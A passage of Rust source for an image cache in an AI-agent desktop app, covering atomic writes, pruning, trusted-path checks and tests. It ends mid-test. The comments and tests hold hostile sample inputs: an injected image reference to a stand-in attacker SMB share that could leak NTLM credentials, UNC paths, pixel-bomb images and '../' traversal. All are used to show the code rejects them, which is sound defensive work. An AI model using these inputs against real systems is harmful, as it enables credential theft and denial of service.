/// 表的上限：一个进程里见过的图片写入调用通常几十个；超了整表清掉重来（只影响跨批次补图）。
const WRITTEN_MAX: usize = 4096;

fn is_image_ext(path: &Path) -> bool {
    path.extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| matches!(e.to_ascii_lowercase().as_str(), "png" | "jpg" | "jpeg" | "gif" | "webp" | "svg"))
}

/// 登记一次写入调用写了哪些文件；只留绝对路径、图片扩展名、不是 UNC 的（相对路径不知道相对谁，
/// 交给前端按 detail.path 现解析）。
pub fn remember_written(call_id: &str, paths: impl IntoIterator<Item = String>) {
    let paths: Vec<PathBuf> = paths
        .into_iter()
        .map(PathBuf::from)
        .filter(|p| p.is_absolute() && is_image_ext(p) && !is_remote(p))
        .collect();
    if paths.is_empty() {
        return;
    }
    let mut table = WRITTEN_IMAGES.lock().unwrap_or_else(|e| e.into_inner());
    let table = table.get_or_insert_with(Default::default);
    if table.len() >= WRITTEN_MAX {
        table.clear();
    }
    table.insert(call_id.to_string(), paths);
    WRITTEN_ANY.store(true, Ordering::Relaxed);
}

/// 这次回执对应的调用写过哪些图片（没登记过为 None）。
pub fn written_for(call_id: &str) -> Option<Vec<PathBuf>> {
    if !WRITTEN_ANY.load(Ordering::Relaxed) {
        return None;
    }
    WRITTEN_IMAGES
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .as_ref()?
        .get(call_id)
        .cloned()
}

/// 给「调用 `call_id` 写出的 `path`」留快照：第一次调用时把当时的文件内容存进 `tool/`
/// （按「调用 id + 路径」命名），之后再调直接返回同一份，不再读原文件——同一路径写三次就是
/// 三张不同的图，原文件改了、删了也不影响已有的快照。原文件读不了或不是真图返回 None。
pub fn snapshot_written_in(root: &Path, call_id: &str, path: &Path) -> Option<PathBuf> {
    let key = format!("write\n{call_id}\n{}", path.display());
    if let Some(hit) = cached_keyed_in(root, ImageKind::Tool, &key) {
        return Some(hit);
    }
    let bytes = read_image_file(path).ok()?;
    store_keyed_in(root, ImageKind::Tool, &key, &bytes).ok()
}

/// 同上，默认根目录。
pub fn snapshot_written(call_id: &str, path: &Path) -> Option<PathBuf> {
    snapshot_written_in(&images_root()?, call_id, path)
}

/// 同上，输入是 `data:image/...;base64,...` 网址（OpenCode 的附件形态）。
pub fn store_tool_data_url(url: &str) -> Option<PathBuf> {
    let rest = url.strip_prefix("data:")?;
    let (meta, data) = rest.split_once(',')?;
    if !meta.ends_with(";base64") {
        return None;
    }
    store_tool_base64(data)
}

fn default_root() -> Result<PathBuf, ImageError> {
    images_root().ok_or_else(|| {
        ImageError::new(
            ImageErrorCode::Forbidden,
            "找不到用户目录，没法保存图片",
        )
    })
}

fn io_error(e: std::io::Error) -> ImageError {
    ImageError::new(ImageErrorCode::Forbidden, format!("保存图片失败：{e}"))
}

static TMP_SEQ: AtomicU64 = AtomicU64::new(0);

/// 图片目录的读写锁：写入、刷新修改时间持读锁（彼此并发），回收删除阶段持写锁。
/// 见 [`prune_in_with`]。
static STORE_LOCK: std::sync::RwLock<()> = std::sync::RwLock::new(());

/// 原子落盘：临时文件 + rename，读端不会看到半张图；目标已存在且大小一致就直接复用。
/// 第二个返回值：这次是否真写了新文件（复用已有的为 false）。
///
/// `durable`：落盘前 fsync。只给 `sent/`（agent 发的图，删了就没了）；`tool/` 等可再生的
/// 不 fsync——一次整读要落上百张回执图时 fsync 让首次解析慢一倍（2026-11-21 实测
/// 150 → 307ms），而断电留下的半截文件大小对不上，下次解析会按上面的检查重写。
fn write_named(dir: &Path, name: &str, bytes: &[u8], durable: bool) -> Result<(PathBuf, bool), ImageError> {
    let _guard = STORE_LOCK.read().unwrap_or_else(|e| e.into_inner());
    let path = dir.join(name);
    if let Ok(meta) = std::fs::metadata(&path) {
        if meta.is_file() && meta.len() == bytes.len() as u64 {
            // 修改时间只给回收排先后，精度到小时足够：最近刷过就不再开文件刷一遍（解析热路径）。
            if meta.modified().map_or(true, |m| m.elapsed().map_or(true, |age| age > TOUCH_EVERY)) {
                touch_unlocked(&path);
            }
            return Ok((path, false));
        }
    }
    std::fs::create_dir_all(dir).map_err(io_error)?;
    let seq = TMP_SEQ.fetch_add(1, Ordering::Relaxed);
    let tmp = dir.join(format!("{name}.tmp.{}.{seq}", std::process::id()));
    let written = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&tmp)
        .and_then(|mut file| {
            file.write_all(bytes)?;
            if durable {
                file.sync_all()?;
            }
            Ok(())
        });
    if let Err(e) = written {
        let _ = std::fs::remove_file(&tmp);
        return Err(io_error(e));
    }
    if let Err(e) = std::fs::rename(&tmp, &path) {
        let _ = std::fs::remove_file(&tmp);
        // 并发写同一内容：别人先 rename 成功了，结果一样。
        if std::fs::metadata(&path).is_ok_and(|m| m.len() == bytes.len() as u64) {
            return Ok((path, false));
        }
        return Err(io_error(e));
    }
    Ok((path, true))
}

/// 一张图被查看了：刷新修改时间，回收按它从旧到新删（见 [`prune_in`]）。
pub fn mark_used(path: &Path) {
    touch(path);
}

fn touch(path: &Path) {
    let _guard = STORE_LOCK.read().unwrap_or_else(|e| e.into_inner());
    touch_unlocked(path);
}

/// 刷新修改时间；文件已不在返回 false。
fn touch_unlocked(path: &Path) -> bool {
    match std::fs::OpenOptions::new().write(true).open(path) {
        Ok(file) => {
            let _ = file.set_modified(std::time::SystemTime::now());
            true
        }
        Err(_) => false,
    }
}

/// 解析热路径上「复用已有图片」时，最多隔多久刷新一次修改时间（见 [`write_named`]、[`store_tool_base64`]）。
const TOUCH_EVERY: std::time::Duration = std::time::Duration::from_secs(3600);

/// 回收结果（测试与日志用）。
#[derive(Debug, Default, PartialEq, Eq)]
pub struct PruneReport {
    pub before: u64,
    pub after: u64,
    pub removed: usize,
}

/// 总量超过 `cap` 时回收，直到回到上限以内。顺序：
///
/// 1. 先删 `tool/`、`web/`、`local/` 里最久没用到的——这三类都能再生：`tool/` 在 transcript
///    重解析时按同内容重建，`web/` 能重新下载，`local/` 在原文件还在时重新复制；
/// 2. 仍超出才动 `sent/`，同样从最旧的删。`sent/` 是 agent 主动发的图，原文件可能早没了，
///    删了就真没了，所以排在最后。
///
/// 「最久没用到」按修改时间算：每次复用同一张图都会刷新它（见 [`store_bytes_in`]）。
/// 顺带清掉崩溃遗留的临时文件。只认本模块的命名，不碰目录里的其他东西。
pub fn prune_in(root: &Path, cap: u64) -> PruneReport {
    prune_in_with(root, cap, || {})
}

/// [`prune_in`] 本体；`after_scan` 在扫描完、动手删之前调用（测试在这里模拟并发复用）。
///
/// 扫描不持锁（目录里上万个文件时扫描要一会儿，不能让解析热路径等它）；删除阶段持写锁，
/// 并在删每个文件前重新看一眼修改时间：扫描后被复用过（写入 / 解析 / 查看都会刷新它）的跳过。
/// 写入与刷新持读锁（[`write_named`]、[`touch`]），所以「刚确认存在并下发路径」与「删掉它」
/// 不会交错。
fn prune_in_with(root: &Path, cap: u64, after_scan: impl FnOnce()) -> PruneReport {
    let mut files: Vec<(bool, std::time::SystemTime, u64, PathBuf)> = Vec::new();
    for kind in ImageKind::ALL {
        let dir = root.join(kind.dir_name());
        crate::fsutil::sweep_stale_temp_files(&dir);
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let Ok(meta) = entry.metadata() else { continue };
            if !meta.is_file() {
                continue;
            }
            let mtime = meta.modified().unwrap_or(std::time::UNIX_EPOCH);
            files.push((kind == ImageKind::Sent, mtime, meta.len(), entry.path()));
        }
    }
    after_scan();
    let before: u64 = files.iter().map(|f| f.2).sum();
    let mut total = before;
    let mut removed = 0;
    if total > cap {
        // false（可再生）排在 true（sent）前面；同类按修改时间从旧到新。
        files.sort_by_key(|f| (f.0, f.1));
        let _guard = STORE_LOCK.write().unwrap_or_else(|e| e.into_inner());
        for (_, scanned, len, path) in &files {
            if total <= cap {
                break;
            }
            // 扫描后被复用过：它已经是「刚用到」的了，不按旧时间删。
            let reused = std::fs::metadata(path)
                .and_then(|m| m.modified())
                .is_ok_and(|now| now > *scanned);
            if reused {
                continue;
            }
            if std::fs::remove_file(path).is_ok() {
                total -= len;
                removed += 1;
            }
        }
        if removed > 0 {
            clear_tool_memo();
        }
    }
    PruneReport {
        before,
        after: total,
        removed,
    }
}

/// 默认根目录按 [`IMAGES_TOTAL_CAP`] 回收（宿主在后台线程按 [`prune_loop`] 定时调）。
pub fn prune() -> Option<PruneReport> {
    Some(prune_in(&images_root()?, IMAGES_TOTAL_CAP))
}

/// 除启动时外，每隔多久再回收一次。Meowo 常驻托盘、一开几周不重启，只在启动时查一次的话
/// 目录会一直涨（做空第一轮）；6 小时一次，一次扫描在上万个文件时也只是几十毫秒级。
pub const PRUNE_INTERVAL: std::time::Duration = std::time::Duration::from_secs(6 * 3600);

/// 先跑一次 `tick`，之后每隔 `interval` 再跑；`tick` 返回 false 时停（正式用法永远返回 true）。
pub fn prune_loop(interval: std::time::Duration, mut tick: impl FnMut() -> bool) {
    while tick() {
        std::thread::sleep(interval);
    }
}

/// `path` 是否真的落在 `roots` 之一里面。两边都先解析成真实路径（展开 `..`、符号链接、junction）
/// 再比较前缀：`images/../secret`、指向外面的符号链接都会在这一步露出真身而被拒。
/// 路径不存在返回 None。
pub fn resolve_within(roots: &[PathBuf], path: &Path) -> Option<PathBuf> {
    if is_remote(path) {
        return None;
    }
    let real = std::fs::canonicalize(path).ok()?;
    roots
        .iter()
        .filter_map(|root| std::fs::canonicalize(root).ok())
        .any(|root| real.starts_with(&root))
        .then_some(real)
}

/// 工具回执里可信的图片引用行指向的根：Meowo 自己的图片目录、旧的粘贴目录，以及 Claude 各账号的
/// image-cache（它的粘贴图引用行指向那里）。回执里其他位置的引用行一律当成伪造的（见
/// [`neutralize_untrusted_refs`]）。这里只是一份目录清单，不按 agent 分支。
pub fn trusted_ref_roots() -> Vec<PathBuf> {
    let mut roots = readable_roots();
    roots.extend(crate::plugins::claude::transcript::image_cache_dirs());
    // 回放样本（tests/fixtures/chat-replay）把真机探针的数据目录统一换成了 C:\probe。
    #[cfg(test)]
    roots.push(PathBuf::from(if cfg!(windows) { r"C:\probe\images" } else { "/probe/images" }));
    roots
}

/// 引用行里的路径是否落在 `roots` 之一里面。纯字符串判断，不碰文件系统（这一步要挡的正是
/// 「对攻击者给的路径做 exists」）：必须是绝对路径、不是 UNC、不含 `..`，按分隔符边界比前缀
/// （Windows 上不分大小写、`/` 与 `\` 等同）。
pub fn is_trusted_ref(path: &str, roots: &[PathBuf]) -> bool {
    use std::path::Component;
    let path = path.trim();
    let p = Path::new(path);
    if is_remote_path(path)
        || !p.is_absolute()
        || p.components().any(|c| matches!(c, Component::ParentDir | Component::CurDir))
    {
        return false;
    }
    let norm = |s: &str| -> String {
        let s = if cfg!(windows) { s.replace('/', "\\").to_lowercase() } else { s.to_string() };
        s.trim_end_matches(std::path::MAIN_SEPARATOR).to_string()
    };
    let path = norm(path);
    roots.iter().any(|root| {
        let root = norm(&root.to_string_lossy());
        !root.is_empty()
            && path.len() > root.len()
            && path.starts_with(&root)
            && path[root.len()..].starts_with(std::path::MAIN_SEPARATOR)
    })
}

/// 把回执正文里不指向可信根的图片引用行改写成普通文字：`[Image: source: X]` →
/// `[Image source: X]`（`[Image #3: source: X]` → `[Image #3 source: X]`），前端的 IMAGE_REF
/// 认不出它，就不会拿去 convertFileSrc；内容原样留着，用户仍看得到回执写了什么。
///
/// 为什么（做空第二轮）：回执正文来自网页、文件、命令输出，谁都能写一行
/// `[Image: source: //attacker/s/x.png]`；前端会把它当缩略图自动加载，而 Tauri asset 协议在判
/// 白名单之前就对路径做 is_symlink/exists，Windows 上即发起 SMB、可能带出 NTLM 凭据。
pub fn neutralize_untrusted_refs(text: &mut String) {
    if !text.contains("source: ") {
        return;
    }
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    // 与前端 Message.tsx / ChatImage.tsx 的 IMAGE_REF 同一个式子。
    let re = RE.get_or_init(|| regex::Regex::new(r"\[Image( #\d+)?: source: ([^\]]+?)\]").unwrap());
    if !re.is_match(text) {
        return;
    }
    let roots = trusted_ref_roots();
    let replaced = re.replace_all(text, |caps: &regex::Captures| {
        let path = &caps[2];
        if is_trusted_ref(path, &roots) {
            caps[0].to_string()
        } else {
            format!("[Image{} source: {path}]", caps.get(1).map_or("", |m| m.as_str()))
        }
    });
    if let std::borrow::Cow::Owned(new) = replaced {
        *text = new;
    }
}

/// 允许对话页读取的图片根：持久图片目录 + 旧数据的 `$TEMP/meowo-paste`（历史引用照常能读）。
pub fn readable_roots() -> Vec<PathBuf> {
    let mut roots: Vec<PathBuf> = images_root().into_iter().collect();
    roots.push(crate::fsutil::paste_root());
    roots
}

#[cfg(test)]
mod tests {
    use super::*;

    const PNG_1X1: &[u8] = &[
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44,
        0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F,
        0x15, 0xC4, 0x89, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9C, 0x63, 0x00,
        0x01, 0x00, 0x00, 0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00, 0x00, 0x00, 0x00, 0x49,
        0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
    ];

    fn temp_root(tag: &str) -> PathBuf {
        let seq = TMP_SEQ.fetch_add(1, Ordering::Relaxed);
        let dir = std::env::temp_dir().join(format!(
            "meowo-images-test-{tag}-{}-{seq}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn sniffs_by_header_not_extension() {
        assert_eq!(sniff_image(PNG_1X1), Some("png"));
        assert_eq!(sniff_image(&[0xFF, 0xD8, 0xFF, 0xE0, 0, 0]), Some("jpg"));
        assert_eq!(sniff_image(b"GIF89a\x01\x00\x01\x00"), Some("gif"));
        assert_eq!(sniff_image(b"RIFF\x24\x00\x00\x00WEBPVP8 "), Some("webp"));
        assert_eq!(sniff_image(b"<html><body>404</body></html>"), None);
        assert_eq!(sniff_image(b"MZ\x90\x00"), None);
        assert_eq!(sniff_image(b""), None);
    }

    #[test]
    fn svg_is_sniffed_as_text_only() {
        assert_eq!(sniff_image(b"<svg xmlns='http://www.w3.org/2000/svg'/>"), Some("svg"));
        assert_eq!(
            sniff_image(
                "\u{feff}<?xml version=\"1.0\"?>\n<!-- made by agent -->\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"x\">\n<svg width=\"10\">"
                    .as_bytes()
            ),
            Some("svg")
        );
        assert_eq!(sniff_image(b"<!DOCTYPE svg [ <!ENTITY a \"b\"> ]><svg>"), Some("svg"));
        // HTML、带 svg 字样的普通文本、svgfoo 元素都不是。
        assert_eq!(sniff_image(b"<!DOCTYPE html><html><svg></svg></html>"), None);
        assert_eq!(sniff_image(b"hello <svg>"), None);
        assert_eq!(sniff_image(b"<svgfoo>"), None);
        assert_eq!(sniff_image(b"<?xml version=\"1.0\""), None);
    }

    #[test]
    fn reads_dimensions_and_rejects_pixel_bombs() {
        assert_eq!(image_dimensions(PNG_1X1), Some((1, 1)));
        assert_eq!(image_dimensions(b"GIF89a\x10\x00\x20\x00"), Some((16, 32)));
        // 1×1 的 PNG 头改成 20000×20000：文件极小，解出来 1.6GB。
        let mut bomb = PNG_1X1.to_vec();
        bomb[16..20].copy_from_slice(&20000u32.to_be_bytes());
        bomb[20..24].copy_from_slice(&20000u32.to_be_bytes());
        assert_eq!(validate(&bomb).unwrap_err().code, ImageErrorCode::TooLarge);
        // 最小 JPEG 段序列：SOI、APP0、SOF0（高 480 宽 640）。
        let mut jpg = vec![0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x04, 0x00, 0x00];
        jpg.extend_from_slice(&[0xFF, 0xC0, 0x00, 0x11, 0x08, 0x01, 0xE0, 0x02, 0x80, 0x03]);
        assert_eq!(image_dimensions(&jpg), Some((640, 480)));
    }

    /// 做空复现：60000×60000 的 JPEG 在 SOF 前插一个杂字节。浏览器（libjpeg 的 next_marker）
    /// 会跳过段间杂字节照常解码，旧实现遇到非 0xFF 就放弃读尺寸、且读不出尺寸时放行。
    #[test]
    fn jpeg_bomb_with_junk_byte_before_sof_is_rejected() {
        let mut jpg = vec![0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x04, 0x00, 0x00];
        jpg.push(0x00); // 杂字节
        // SOF0：长度 17、精度 8、高 60000、宽 60000、3 个分量。
        jpg.extend_from_slice(&[0xFF, 0xC0, 0x00, 0x11, 0x08, 0xEA, 0x60, 0xEA, 0x60, 0x03]);
        jpg.extend_from_slice(&[0x01, 0x22, 0x00, 0x02, 0x11, 0x01, 0x03, 0x11, 0x01]);
        jpg.extend_from_slice(&[0xFF, 0xD9]);
        let err = validate(&jpg).unwrap_err();
        assert_eq!(err.code, ImageErrorCode::TooLarge, "{err:?}");
    }

    /// 位图读不出尺寸一律拒：截断的 PNG、IHDR 不在第一块的 PNG、没有 SOF 的 JPEG、
    /// 不认识子格式的 WebP。
    #[test]
    fn bitmap_without_readable_dimensions_is_rejected() {
        let code = |bytes: &[u8]| validate(bytes).map(|_| ()).unwrap_err().code;
        assert_eq!(code(&PNG_1X1[..14]), ImageErrorCode::NotImage);
        let mut not_ihdr = PNG_1X1.to_vec();
        not_ihdr[12..16].copy_from_slice(b"tEXt");
        assert_eq!(code(&not_ihdr), ImageErrorCode::NotImage);
        assert_eq!(code(&[0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x04, 0x00, 0x00, 0xFF, 0xD9, 0, 0]), ImageErrorCode::NotImage);
        assert_eq!(code(b"RIFF\x24\x00\x00\x00WEBPXXXX\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"), ImageErrorCode::NotImage);
        assert_eq!(code(b"GIF89a\x01"), ImageErrorCode::NotImage);
        // 正常的 1×1 仍收。
        assert_eq!(validate(PNG_1X1).unwrap(), "png");
    }

    /// SVG 的 width/height/viewBox 有上限：`<img>` 按固有尺寸栅格化，灯箱原尺寸显示时
    /// 一张几百字节的 SVG 能让渲染进程申请数 GB。
    #[test]
    fn svg_dimensions_are_capped() {
        let code = |s: &str| validate(s.as_bytes()).map(|_| ()).map_err(|e| e.code);
        assert_eq!(code(r#"<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"/>"#), Ok(()));
        assert_eq!(code(r#"<svg width="100%" height="100%" viewBox="0 0 800 600"></svg>"#), Ok(()));
        assert_eq!(code(r#"<svg xmlns="http://www.w3.org/2000/svg"/>"#), Ok(()));
        assert_eq!(code(r#"<svg width="100000" height="100000"/>"#), Err(ImageErrorCode::TooLarge));
        assert_eq!(code(r#"<svg width="50000px" height="10"/>"#), Err(ImageErrorCode::TooLarge));
        assert_eq!(code(r#"<svg width="200in" height="200in"/>"#), Err(ImageErrorCode::TooLarge));
        // 没写 width/height 时按 viewBox 定固有尺寸。
        assert_eq!(code(r#"<svg viewBox="0 0 90000 90000"/>"#), Err(ImageErrorCode::TooLarge));
        assert_eq!(code("\u{feff}<?xml version=\"1.0\"?>\n<svg\n  width='12000'\n  height='12000'>"), Err(ImageErrorCode::TooLarge));
    }

    /// UNC 与设备路径在任何文件系统访问之前拒绝（Windows 上访问 `\\host\share` 会发起 SMB
    /// 连接并可能带出 NTLM 凭据）。192.0.2.1 是文档保留地址，真去连会卡到网络超时，
    /// 所以「远快于超时」就说明没碰文件系统。
    #[test]
    fn unc_paths_are_rejected_before_any_filesystem_access() {
        let root = temp_root("unc");
        for raw in [
            r"\\192.0.2.1\share\a.png",
            "//192.0.2.1/share/a.png",
            r"\/192.0.2.1/share/a.png",
            r"\\?\UNC\192.0.2.1\share\a.png",
            r"\\.\pipe\meowo",
            r"\\?\GLOBALROOT\Device\Mup\192.0.2.1\share\a.png",
        ] {
            let started = std::time::Instant::now();
            assert!(is_remote_path(raw), "{raw}");
            let err = store_file_in(&root, ImageKind::Sent, Path::new(raw)).unwrap_err();
            assert_eq!(err.code, ImageErrorCode::Forbidden, "{raw}");
            assert!(resolve_within(std::slice::from_ref(&root), Path::new(raw)).is_none());
            assert!(started.elapsed() < std::time::Duration::from_millis(500), "{raw} 碰了文件系统");
        }
        for local in [r"C:\Users\a.png", "/home/a.png", r"\\?\C:\a.png", "relative/a.png", r"\single\a.png"] {
            assert!(!is_remote_path(local), "{local}");
        }
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn store_dedups_by_content_and_rejects_bad_input() {
        let root = temp_root("store");
        let a = store_bytes_in(&root, ImageKind::Sent, PNG_1X1).unwrap();
        let b = store_bytes_in(&root, ImageKind::Sent, PNG_1X1).unwrap();
        assert_eq!(a, b, "同一内容只存一份");
        assert!(a.starts_with(root.join("sent")));
        assert_eq!(a.extension().unwrap(), "png");
        assert_eq!(std::fs::read(&a).unwrap(), PNG_1X1);
        assert_eq!(std::fs::read_dir(root.join("sent")).unwrap().count(), 1);

        let not_image = store_bytes_in(&root, ImageKind::Sent, b"<html>").unwrap_err();
        assert_eq!(not_image.code, ImageErrorCode::NotImage);
        assert!(not_image.receipt().starts_with("[Image error: not_image] "));

        let mut big = PNG_1X1.to_vec();
        big.resize(IMAGE_MAX_BYTES as usize + 1, 0);
        assert_eq!(
            store_bytes_in(&root, ImageKind::Sent, &big).unwrap_err().code,
            ImageErrorCode::TooLarge
        );
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn store_file_reports_missing_and_oversized_before_reading() {
        let root = temp_root("file");
        let missing = store_file_in(&root, ImageKind::Sent, &root.join("nope.png")).unwrap_err();
        assert_eq!(missing.code, ImageErrorCode::NotFound);
        let dir = store_file_in(&root, ImageKind::Sent, &root).unwrap_err();
        assert_eq!(dir.code, ImageErrorCode::NotFound);
        // 稀疏的大文件：只设长度不写内容，验证按元数据拦下。
        let big = root.join("big.png");
        std::fs::File::create(&big)
            .unwrap()
            .set_len(IMAGE_MAX_BYTES + 1)
            .unwrap();
        assert_eq!(
            store_file_in(&root, ImageKind::Sent, &big).unwrap_err().code,
            ImageErrorCode::TooLarge
        );
        // 扩展名是 png、内容是文本：按文件头拒。
        let fake = root.join("fake.png");
        std::fs::write(&fake, "not an image").unwrap();
        assert_eq!(
            store_file_in(&root, ImageKind::Sent, &fake).unwrap_err().code,
            ImageErrorCode::NotImage
        );
        let _ = std::fs::remove_dir_all(&root);
    }

    /// 验收 #7：原文件删除后，持久目录里的副本照样能读。
    #[test]
    fn copy_survives_source_deletion() {
        let root = temp_root("survive");
        let source = root.join("chart.png");
        std::fs::write(&source, PNG_1X1).unwrap();
        let kept = store_file_in(&root, ImageKind::Sent, &source).unwrap();
        std::fs::remove_file(&source).unwrap();
        assert!(!source.exists());
        assert_eq!(std::fs::read(&kept).unwrap(), PNG_1X1);
        assert!(resolve_within(&[root.join("sent")], &kept).is_some());
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn keyed_cache_is_found_by_key() {
        let root = temp_root("keyed");
        let url = "https://example.com/a.png?x=1";
        assert!(cached_keyed_in(&root, ImageKind::Web, url).is_none());
        let stored = store_keyed_in(&root, ImageKind::Web, url, PNG_1X1).unwrap();
        assert_eq!(cached_keyed_in(&root, ImageKind::Web, url), Some(stored));
        assert!(cached_keyed_in(&root, ImageKind::Web, "https://example.com/b.png").is_none());
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn base64_and_data_url_go_to_tool_dir_and_reject_non_images() {
        use base64::Engine;
        let b64 = base64::engine::general_purpose::STANDARD.encode(PNG_1X1);
        let root = temp_root("b64");
        // store_tool_base64 用默认根；这里只验证解码与判定路径，落盘用显式根。
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(b64.as_bytes())
            .unwrap();
        assert!(store_bytes_in(&root, ImageKind::Tool, &bytes).is_ok());
        assert!(store_tool_data_url("data:text/plain;base64,aGVsbG8=").is_none());
        assert!(store_tool_data_url("data:image/png,raw").is_none());
        assert!(store_tool_base64("!!!not base64").is_none());
        let _ = std::fs::remove_dir_all(&root);
    }

    /// 回收顺序：先删可再生的（tool/web/local）里最旧的，sent 留到最后。
    #[test]
    fn prune_evicts_regenerable_oldest_first_and_sent_last() {
        use std::time::{Duration, SystemTime};
        let root = temp_root("prune");
        let now = SystemTime::now();
        let put = |kind: ImageKind, name: &str, age_secs: u64| {
            let dir = root.join(kind.dir_name());
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join(name);
            std::fs::write(&path, vec![0u8; 100]).unwrap();
            std::fs::OpenOptions::new()
                .write(true)
                .open(&path)
                .unwrap()
                .set_modified(now - Duration::from_secs(age_secs))
                .unwrap();
            path
        };
        let sent_old = put(ImageKind::Sent, "s.png", 9000);
        let tool_old = put(ImageKind::Tool, "t.png", 500);
        let web_new = put(ImageKind::Web, "w.png", 10);
        let local_mid = put(ImageKind::Local, "l.png", 100);
        // 一份崩溃残留的临时文件（够老）。
        let stale = put(ImageKind::Tool, "x.png.tmp.1.2", 7200);

        // 不超上限：什么都不删（残留临时文件除外）。
        let report = prune_in(&root, 10_000);
        assert_eq!(report.removed, 0);
        assert!(!stale.exists(), "过期临时文件应被清掉");

        // 上限 250：400 → 需删两个，先删最旧的可再生图 tool，再删 local，sent 与最新的 web 保留。
        let report = prune_in(&root, 250);
        assert_eq!((report.before, report.after, report.removed), (400, 200, 2));
        assert!(!tool_old.exists() && !local_mid.exists());
        assert!(sent_old.exists(), "sent 最后才动");
        assert!(web_new.exists());

        // 上限 50：可再生的删光后才删 sent。
        let report = prune_in(&root, 50);
        assert_eq!(report.after, 0);
        assert!(!sent_old.exists() && !web_new.exists());
        let _ = std::fs::remove_dir_all(&root);
    }

    /// 回执内嵌图的进程内备忘：同一段 base64 第二次起不再解码、不碰文件系统，直接给上次的路径；
    /// 不是图的也记住（不再反复解码）；回收删过文件后整表作废，按原流程重存。
    #[test]
    fn tool_base64_memo_reuses_result_until_prune() {
        use base64::Engine;
        let mut png = PNG_1X1.to_vec();
        png[16..20].copy_from_slice(&7u32.to_be_bytes()); // 本测试独有的内容，不和别的测试共享文件
        png[20..24].copy_from_slice(&3u32.to_be_bytes());
        let data = base64::engine::general_purpose::STANDARD.encode(&png);
        let first = store_tool_base64(&data).unwrap();
        assert!(first.exists());
        std::fs::remove_file(&first).unwrap();
        // 备忘命中：不查文件，路径照旧（每隔 TOUCH_EVERY 才回头确认一次文件还在）。
        assert_eq!(store_tool_base64(&data), Some(first.clone()));
        assert!(!first.exists());
        clear_tool_memo();
        assert_eq!(store_tool_base64(&data), Some(first.clone()));
        assert!(first.exists(), "备忘作废后按原流程重存");
        assert_eq!(store_tool_base64("aGVsbG8="), None);
        assert_eq!(store_tool_base64("aGVsbG8="), None);
        std::fs::remove_file(&first).ok();
    }

    /// 回收与写入 / 解析共用一把锁：扫描之后、真删之前有人复用了某张图（解析时同内容重写会
    /// 刷新修改时间），这张图不能按扫描时的旧时间被删掉——否则刚下发给前端的路径立刻失效。
    /// 钩子在扫描后、删除前模拟一次复用。
    #[test]
    fn prune_does_not_delete_a_file_reused_after_scan() {
        use std::time::{Duration, SystemTime};
        let root = temp_root("prune-race");
        let dir = root.join("tool");
        std::fs::create_dir_all(&dir).unwrap();
        let old = dir.join("old.png");
        let newer = dir.join("newer.png");
        for (path, age) in [(&old, 900), (&newer, 60)] {
            std::fs::write(path, vec![0u8; 100]).unwrap();
            std::fs::OpenOptions::new()
                .write(true)
                .open(path)
                .unwrap()
                .set_modified(SystemTime::now() - Duration::from_secs(age))
                .unwrap();
        }
        let report = prune_in_with(&root, 150, || mark_used(&old));
        assert!(old.exists(), "扫描后被复用的图不能删");
        assert!(!newer.exists(), "该删的换成扫描时较新的那张");
        assert_eq!(report.removed, 1);
        let _ = std::fs::remove_dir_all(&root);
    }

    /// 除启动时外每 6 小时回收一次：循环先跑一次，之后每隔一个间隔再跑。
    #[test]
    fn prune_runs_at_start_and_then_every_interval() {
        assert_eq!(PRUNE_INTERVAL, std::time::Duration::from_secs(6 * 3600));
        let mut ticks = 0;
        let started = std::time::Instant::now();
        prune_loop(std::time::Duration::from_millis(5), || {
            ticks += 1;
            ticks < 3
        });
        assert_eq!(ticks, 3);
        assert!(started.elapsed() >= std::time::Duration::from_millis(10), "两次间隔都要等");
    }

    #[test]
    fn resolve_within_rejects_dotdot_and_links_outside() {
        let base = temp_root("within");
        let root = base.join("images");
        std::fs::create_dir_all(root.join("sent")).unwrap();
        let inside = root.join("sent").join("a.png");
        std::fs::write(&inside, PNG_1X1).unwrap();
        let outside = base.join("secret.txt");
        std::fs::write(&outside, "secret").unwrap();
        let roots = vec![root.clone()];

        assert!(resolve_within(&roots, &inside).is_some());
        // ../ 穿越。
        assert!(resolve_within(&roots, &root.join("sent").join("..").join("..").join("secret.txt")).is_none());
        // 不存在的路径。
        assert!(resolve_within(&roots, &root.join("missing.png")).is_none());
        // 目录内指向外面的符号链接（Windows 无权限建文件符号链接时跳过这一段）。
        let link = root.join("sent").join("link.png");
        #[cfg(unix)]
        let made = std::os::unix::fs::symlink(&outside, &link).is_ok();
        #[cfg(windows)]
        let made = std::os::windows::fs::symlink_file(&outside, &link).is_ok();
        if made {
            assert!(resolve_within(&roots, &link).is_none(), "符号链接指向外面应被拒");
        }
        // junction（Windows 不需要权限）：目录内一个 junction 指向外面的目录。
        #[cfg(windows)]
        {
            let target = base.join("outside-dir");
            std::fs::create_dir_all(&target).unwrap();
            std::fs::write(target.join("x.png"), PNG_1X1).unwrap();
